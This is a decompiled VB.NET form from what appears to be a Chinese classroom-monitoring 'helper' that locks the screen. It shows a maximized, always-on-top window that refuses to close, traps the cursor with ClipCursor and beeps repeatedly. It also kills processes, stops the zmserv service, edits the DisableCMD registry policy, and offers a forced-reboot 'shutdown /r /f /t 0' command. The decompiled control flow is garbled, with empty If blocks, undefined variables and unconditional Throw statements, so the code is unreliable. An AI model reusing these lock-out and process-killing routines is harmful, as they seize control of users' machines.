Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Runtime.InteropServices
Imports System.Threading
Imports System.Windows.Forms
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports Microsoft.Win32
Imports WindowsApplication1.Internal

Namespace WindowsApplication1

	<DesignerGenerated()>
	Public Partial Class Form2
		Inherits Form

	
		Public Sub New()
			AddHandler MyBase.FormClosing, AddressOf Me.IncludeState
			AddHandler MyBase.Load, AddressOf Me.CallState
			Me.QueryState()
		End Sub

	
		<DebuggerStepThrough()>
		Private Sub QueryState()
			Me.m_ClientStatus = New Container()
			Me.Button2 = New Button()
			Me.Label2 = New Label()
			Me.Label1 = New Label()
			Me.TextBox1 = New TextBox()
			Me.Button1 = New Button()
			Me.shuoming = New Label()
			Me.Timer_frm2 = New Timer(Me.m_ClientStatus)
			Me.shuoming2 = New Label()
			Me.Label_pd = New Label()
			Me.shuoming3 = New Label()
			MyBase.SuspendLayout()
			Me.Button2.Location = New Point(389, 17)
			Me.Button2.Name = "Button2"
			Me.Button2.Size = New Size(82, 28)
			Me.Button2.TabIndex = 15
			Me.Button2.Text = "重启电脑"
			Me.Button2.UseVisualStyleBackColor = True
			Me.Label2.AutoSize = True
			Me.Label2.Font = New Font("宋体", 10.5F, FontStyle.Regular, GraphicsUnit.Point, 134)
			Me.Label2.ForeColor = Color.DarkRed
			Me.Label2.Location = New Point(34, 65)
			Me.Label2.Name = "Label2"
			Me.Label2.Size = New Size(0, 14)
			Me.Label2.TabIndex = 14
			Me.Label1.AutoSize = True
			Me.Label1.Font = New Font("宋体", 10.5F, FontStyle.Regular, GraphicsUnit.Point, 134)
			Me.Label1.ForeColor = Color.White
			Me.Label1.Location = New Point(61, 23)
			Me.Label1.Name = "Label1"
			Me.Label1.Size = New Size(119, 14)
			Me.Label1.TabIndex = 13
			Me.Label1.Text = "退出小助手密码："
			Me.TextBox1.Location = New Point(196, 19)
			Me.TextBox1.Name = "TextBox1"
			Me.TextBox1.PasswordChar = "*"c
			Me.TextBox1.Size = New Size(104, 21)
			Me.TextBox1.TabIndex = 12
			Me.Button1.Location = New Point(311, 16)
			Me.Button1.Name = "Button1"
			Me.Button1.Size = New Size(54, 27)
			Me.Button1.TabIndex = 11
			Me.Button1.Text = "确 定"
			Me.Button1.UseVisualStyleBackColor = True
			Me.shuoming.AutoSize = True
			Me.shuoming.Font = New Font("宋体", 26.25F, FontStyle.Regular, GraphicsUnit.Point, 134)
			Me.shuoming.ForeColor = Color.Red
			Me.shuoming.Location = New Point(152, 299)
			Me.shuoming.Name = "shuoming"
			Me.shuoming.Size = New Size(1136, 35)
			Me.shuoming.TabIndex = 16
			Me.shuoming.Text = "你运行的软件危害电子教室运行！如有误判，请老师拍照与作者QQ联系。"
			Me.Timer_frm2.Interval = 1000
			Me.shuoming2.AutoSize = True
			Me.shuoming2.Font = New Font("宋体", 26.25F, FontStyle.Regular, GraphicsUnit.Point, 134)
			Me.shuoming2.ForeColor = Color.Red
			Me.shuoming2.Location = New Point(152, 372)
			Me.shuoming2.Name = "shuoming2"
			Me.shuoming2.Size = New Size(33, 35)
			Me.shuoming2.TabIndex = 17
			Me.shuoming2.Text = " "
			Me.Label_pd.AutoSize = True
			Me.Label_pd.Font = New Font("宋体", 26.25F, FontStyle.Regular, GraphicsUnit.Point, 134)
			Me.Label_pd.Location = New Point(1, 2)
			Me.Label_pd.Name = "Label_pd"
			Me.Label_pd.Size = New Size(51, 35)
			Me.Label_pd.TabIndex = 18
			Me.Label_pd.Text = "  "
			Me.shuoming3.AutoSize = True
			Me.shuoming3.Font = New Font("宋体", 14.25F, FontStyle.Regular, GraphicsUnit.Point, 134)
			Me.shuoming3.ForeColor = SystemColors.ActiveCaptionText
			Me.shuoming3.Location = New Point(669, 125)
			Me.shuoming3.Name = "shuoming3"
			Me.shuoming3.Size = New Size(409, 19)
			Me.shuoming3.TabIndex = 19
			Me.shuoming3.Text = "                                        "
			MyBase.AutoScaleDimensions = New SizeF(6F, 12F)
			MyBase.AutoScaleMode = AutoScaleMode.Font
			Me.BackColor = SystemColors.Highlight
			MyBase.ClientSize = New Size(1518, 1092)
			MyBase.Controls.Add(Me.shuoming3)
			MyBase.Controls.Add(Me.Label_pd)
			MyBase.Controls.Add(Me.shuoming2)
			MyBase.Controls.Add(Me.shuoming)
			MyBase.Controls.Add(Me.Button2)
			MyBase.Controls.Add(Me.Label2)
			MyBase.Controls.Add(Me.Label1)
			MyBase.Controls.Add(Me.TextBox1)
			MyBase.Controls.Add(Me.Button1)
			MyBase.FormBorderStyle = FormBorderStyle.None
			MyBase.Name = "Form2"
			MyBase.ShowInTaskbar = False
			Me.Text = "Form2"
			MyBase.TopMost = True
			MyBase.WindowState = FormWindowState.Maximized
			MyBase.ResumeLayout(False)
			MyBase.PerformLayout()
		End Sub

	
		' (get) Token: 0x06000070 RID: 112 RVA: 0x0000258C File Offset: 0x0000078C
		' (set) Token: 0x06000071 RID: 113 RVA: 0x00007430 File Offset: 0x00005630
		Friend Overridable Property Button2 As Button
			<CompilerGenerated()>
			Get
				Return Me._WatcherStatus
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.TestState
				Dim watcherStatus As Button = Me._WatcherStatus
				If watcherStatus IsNot Nothing Then
					RemoveHandler watcherStatus.Click, value2
				End If
				Me._WatcherStatus = value
				watcherStatus = Me._WatcherStatus
				If watcherStatus IsNot Nothing Then
					AddHandler watcherStatus.Click, value2
				End If
			End Set
		End Property

	
		' (get) Token: 0x06000072 RID: 114 RVA: 0x00002594 File Offset: 0x00000794
		' (set) Token: 0x06000073 RID: 115 RVA: 0x0000259C File Offset: 0x0000079C
		Friend Overridable Property Label2 As Label

	
		' (get) Token: 0x06000074 RID: 116 RVA: 0x000025A5 File Offset: 0x000007A5
		' (set) Token: 0x06000075 RID: 117 RVA: 0x000025AD File Offset: 0x000007AD
		Friend Overridable Property Label1 As Label

	
		' (get) Token: 0x06000076 RID: 118 RVA: 0x000025B6 File Offset: 0x000007B6
		' (set) Token: 0x06000077 RID: 119 RVA: 0x000025BE File Offset: 0x000007BE
		Friend Overridable Property TextBox1 As TextBox

	
		' (get) Token: 0x06000078 RID: 120 RVA: 0x000025C7 File Offset: 0x000007C7
		' (set) Token: 0x06000079 RID: 121 RVA: 0x00007474 File Offset: 0x00005674
		Friend Overridable Property Button1 As Button
			<CompilerGenerated()>
			Get
				Return Me.serviceStatus
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.ReflectState
				Dim button As Button = Me.serviceStatus
				If button IsNot Nothing Then
					RemoveHandler button.Click, value2
				End If
				Me.serviceStatus = value
				button = Me.serviceStatus
				If button IsNot Nothing Then
					AddHandler button.Click, value2
				End If
			End Set
		End Property

	
		' (get) Token: 0x0600007A RID: 122 RVA: 0x000025CF File Offset: 0x000007CF
		' (set) Token: 0x0600007B RID: 123 RVA: 0x000025D7 File Offset: 0x000007D7
		Friend Overridable Property shuoming As Label

	
		' (get) Token: 0x0600007C RID: 124 RVA: 0x000025E0 File Offset: 0x000007E0
		' (set) Token: 0x0600007D RID: 125 RVA: 0x000074B8 File Offset: 0x000056B8
		Friend Overridable Property Timer_frm2 As Timer
			<CompilerGenerated()>
			Get
				Return Me.rulesStatus
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Timer)
				Dim value2 As EventHandler = AddressOf Me.RunState
				Dim timer As Timer = Me.rulesStatus
				If timer IsNot Nothing Then
					RemoveHandler timer.Tick, value2
				End If
				Me.rulesStatus = value
				timer = Me.rulesStatus
				If timer IsNot Nothing Then
					AddHandler timer.Tick, value2
				End If
			End Set
		End Property

	
		' (get) Token: 0x0600007E RID: 126 RVA: 0x000025E8 File Offset: 0x000007E8
		' (set) Token: 0x0600007F RID: 127 RVA: 0x000025F0 File Offset: 0x000007F0
		Friend Overridable Property shuoming2 As Label

	
		' (get) Token: 0x06000080 RID: 128 RVA: 0x000025F9 File Offset: 0x000007F9
		' (set) Token: 0x06000081 RID: 129 RVA: 0x000074FC File Offset: 0x000056FC
		Friend Overridable Property Label_pd As Label
			<CompilerGenerated()>
			Get
				Return Me.m_TemplateStatus
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Dim value2 As EventHandler = AddressOf Me.ChangeState
				Dim templateStatus As Label = Me.m_TemplateStatus
				If templateStatus IsNot Nothing Then
					RemoveHandler templateStatus.DoubleClick, value2
				End If
				Me.m_TemplateStatus = value
				templateStatus = Me.m_TemplateStatus
				If templateStatus IsNot Nothing Then
					AddHandler templateStatus.DoubleClick, value2
				End If
			End Set
		End Property

	
		' (get) Token: 0x06000082 RID: 130 RVA: 0x00002601 File Offset: 0x00000801
		' (set) Token: 0x06000083 RID: 131 RVA: 0x00002609 File Offset: 0x00000809
		Friend Overridable Property shuoming3 As Label

	
		Public Declare Ansi Function ClipCursor Lib "user32" (lpRect As Form2.RECT) As Integer

	
		Private Declare Ansi Function Beep Lib "kernel32" (long_0 As Long, long_1 As Long) As Long

	
		Private Sub ReflectState(sender As Object, e As EventArgs)
			Dim obj As Object
			Try

				ProjectData.ClearProjectError()

				Dim num2 As Integer = 2
				If Strings.Len(Me.TextBox1.Text) >= 6 Then
				End If
				Me.Label2.Text = "密码应该是6位以上的字母或数字，请重新输入！"
				Me.TextBox1.Text = ""
				Dim left As String = FilterStatus.DeleteState(Strings.Trim(Me.TextBox1.Text))
				Dim right As String = Conversions.ToString(FilterStatus.SearchState(Registry.CurrentUser, "Software", "n", ""))
				If Operators.CompareString(left, right, False) <> 0 Then
				End If
				Me.Button1.Enabled = False
				Me.GetState()
				Me.Label2.Text = "密码不正确，请重新输入！"
				Me.TextBox1.Text = ""
				Dim num3 As Integer = num4 + 1
				num4 = num2
			Catch obj2 When endfilter(TypeOf obj Is Exception And num <> 0 And num4 = 0)
				Dim ex As Exception = CType(obj2, Exception)
			End Try
			Throw ProjectData.CreateProjectError(-2146828237)
		End Sub

	
		Private Sub RunState(sender As Object, e As EventArgs)
			Dim obj As Object
			Try

				ProjectData.ClearProjectError()

				Dim num2 As Integer = 2
				MyBase.TopMost = True
				Dim lpRect As Form2.RECT
				lpRect.Left = 0
				lpRect.Top = 0
				lpRect.Right = 800
				lpRect.Bottom = 100
				Form2.ClipCursor(lpRect)
				Me.m_InitializerStatus += 1
				If Me.m_InitializerStatus < 5 Then
				End If
				Form2.Beep(2000L, 500L)
			Catch obj2 When endfilter(TypeOf obj Is Exception And num <> 0 And num3 = 0)
				Dim ex As Exception = CType(obj2, Exception)
			End Try
			If num3 <> 0 Then
				ProjectData.ClearProjectError()
			End If
			Return
			Throw ProjectData.CreateProjectError(-2146828237)
		End Sub

	
		Private Sub ChangeState(sender As Object, e As EventArgs)
			Dim obj As Object
			Try
				ProjectData.ClearProjectError()
				Dim num2 As Integer = num3 + 1
				num3 = num4
			Catch obj2 When endfilter(TypeOf obj Is Exception And num <> 0 And num3 = 0)
				Dim ex As Exception = CType(obj2, Exception)
			End Try
			Throw ProjectData.CreateProjectError(-2146828237)
		End Sub

	
		<MethodImpl(MethodImplOptions.NoOptimization)>
		Private Sub GetState()
			Dim obj As Object
			Try

				ProjectData.ClearProjectError()

				Dim num2 As Integer = 2
				Dim text As String = "zmserv"
				Dim text2 As String = Conversions.ToString(FilterStatus.serializerStatus)
				Dim processesByName As Process()
				Do
					processesByName = Process.GetProcessesByName(text2)
					processesByName(0).Kill()
				Loop While processesByName.Length <> 0
				Dim num3 As Integer = 10
				num3 = num3 * 10 + 2
				For Each process As Process In Process.GetProcesses()
					Dim num4 As Integer = Strings.Len(process.ProcessName)
					If num4 >= 4 Then
						Dim num5 As Integer = num4
						Dim j As Integer = 1
						While j <= num5
							Dim num6 As Integer = Strings.Asc(Strings.Mid(process.ProcessName, j, 1))
							If num6 >= num3 Then
								If num6 <= num3 + 9 Then
									j += 1
									Continue While
								End If
							End If
							If j = num4 + 1 Then
								process.Kill()
							End If
						End While
					End If
				Next
				FilterStatus.ReadState(Registry.CurrentUser, "Software\Policies\Microsoft\Windows\System", "DisableCMD", 0, 4)
				Interaction.Shell("net stop zmserv", AppWinStyle.Hide, True, -1)
				Thread.Sleep(3000)
				Dim processesByName2 As Process() = Process.GetProcessesByName(text)
				processesByName2(0).Kill()
				Dim lpRect As Form2.RECT
				lpRect.Left = 0
				lpRect.Top = 0
				lpRect.Right = Screen.PrimaryScreen.Bounds.Width
				lpRect.Bottom = Screen.PrimaryScreen.Bounds.Height
				Form2.ClipCursor(lpRect)
				ProjectData.EndApp()
			Catch obj2 When endfilter(TypeOf obj Is Exception And num <> 0 And num7 = 0)
				Dim ex As Exception = CType(obj2, Exception)
			End Try
			If num7 <> 0 Then
				ProjectData.ClearProjectError()
			End If
			Return
			Throw ProjectData.CreateProjectError(-2146828237)
		End Sub

	
		Private Sub IncludeState(sender As Object, e As FormClosingEventArgs)
			e.Cancel = True
		End Sub

	
		Private Sub CallState(sender As Object, e As EventArgs)
			Dim obj As Object
			Try
				ProjectData.ClearProjectError()
				Dim num2 As Integer = 2
				Me.Timer_frm2.Enabled = True
			Catch obj2 When endfilter(TypeOf obj Is Exception And num <> 0 And num3 = 0)
				Dim ex As Exception = CType(obj2, Exception)
			End Try
			If num3 <> 0 Then
				ProjectData.ClearProjectError()
			End If
			Return
			Throw ProjectData.CreateProjectError(-2146828237)
		End Sub

	
		Private Sub TestState(sender As Object, e As EventArgs)
			Dim obj As Object
			Try

				ProjectData.ClearProjectError()

				Dim num2 As Integer = 2
				Interaction.Shell("shutdown /r /f /t 0", AppWinStyle.MinimizedFocus, False, -1)
				Dim num3 As Integer = num4 + 1
				num4 = num2

			Catch obj2 When endfilter(TypeOf obj Is Exception And num <> 0 And num4 = 0)
				Dim ex As Exception = CType(obj2, Exception)
			End Try

			Throw ProjectData.CreateProjectError(-2146828237)
		End Sub

	
		<CompilerGenerated()>
		<AccessedThroughProperty("Button2")>
		Private _WatcherStatus As Button

	
		<AccessedThroughProperty("Label2")>
		<CompilerGenerated()>
		Private strategyStatus As Label

	
		<AccessedThroughProperty("Label1")>
		<CompilerGenerated()>
		Private m_DatabaseStatus As Label

	
		<AccessedThroughProperty("TextBox1")>
		<CompilerGenerated()>
		Private readerStatus As TextBox

	
		<AccessedThroughProperty("Button1")>
		<CompilerGenerated()>
		Private serviceStatus As Button

	
		<AccessedThroughProperty("shuoming")>
		<CompilerGenerated()>
		Private _EventStatus As Label

	
		<AccessedThroughProperty("Timer_frm2")>
		<CompilerGenerated()>
		Private rulesStatus As Timer

	
		<AccessedThroughProperty("shuoming2")>
		<CompilerGenerated()>
		Private structStatus As Label

	
		<AccessedThroughProperty("Label_pd")>
		<CompilerGenerated()>
		Private m_TemplateStatus As Label

	
		<CompilerGenerated()>
		<AccessedThroughProperty("shuoming3")>
		Private m_AlgoStatus As Label

	
		Private m_InitializerStatus As Integer

	
		Public Structure RECT
		
			Public Left As Integer

		
			Public Top As Integer

		
			Public Right As Integer

		
			Public Bottom As Integer
		End Structure
	End Class
End Namespace
